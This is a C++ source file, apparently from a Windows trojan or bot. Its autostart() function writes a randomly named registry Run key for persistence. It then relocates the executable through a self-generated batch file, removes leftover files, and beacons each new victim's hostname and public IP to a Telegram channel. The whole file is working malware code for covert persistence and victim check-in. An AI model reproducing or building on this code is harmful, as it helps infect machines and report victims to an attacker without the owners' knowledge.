#include "autostart.h"

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

#include "globals.h"
#include "telegram.h"
#include "tools.h"

void autostart() {
    std::string path = PATH;
    int find = path.find("$sysdisk$");
    if (find != std::string::npos) {  // replace $sysdisk$ with actual system disk
        std::string npath;
        npath = tools::GetSysDiskLetter();
        npath += ":" + path.substr(find + std::string("$sysdisk$").size(), path.size());
        path = npath;
    }

    find = path.find("$username$");  // replace $username$ with actual username
    if (find != std::string::npos) {
        path.erase(find, std::string("$username$").size());
        path.insert(find, tools::get_username());
    }

    // if there's no key for autostart in registry yet, it adds one
    std::string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f \"" + path + "" + tools::get_exe() + "\"";
    if (tools::cmd_output(s.c_str()).find("End of search: 0 match(es) found.") != std::string::npos) {
        std::cout << "Adding new key for autostart\n";
        std::string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + tools::random_string(16) + " /t REG_SZ /d \"" + path + "/" + tools::get_exe() + "\"";
        system(cmd.c_str());
    }

    if (!tools::filexists(path + "\\" + tools::get_exe())) {
        telegram::SendText("New user\nUsername: " + tools::hostname() + "\nip: " + tools::public_ip());

        std::fstream file;
        file.open("o.bat", std::ios::out);
        file << "TASKKILL /F /IM \"" << tools::get_exe() << "\"\n"
            << "move \"" << tools::get_exe() << "\"" << " \"" << path << "\"\n"
            << "move \"" << DATA_FILENAME << "\"" << " \"" << path << "\"\n"
            << "move " << "\"shitoo\" \"" << path << "\"\n"
            << "cd " << path << std::endl
            << "start " << tools::get_exe() << std::endl
            << "exit";
        file.close();

        file.open("shitoo", std::ios::out);
        file << "\"" << tools::get_path().substr(0, tools::get_path().size() - tools::get_exe().size()) << "o.bat\"";
        file.close();
        system("start /min o.bat");
    }
    if (tools::filexists(path + "\\shitoo")) {
        std::fstream file;
        std::string path2;
        file.open(path + "\\shitoo", std::ios::in);
        std::getline(file, path2);
        file.close();

        tools::remove(path + "\\" + "shitoo");
        tools::remove(path2);
    }
}
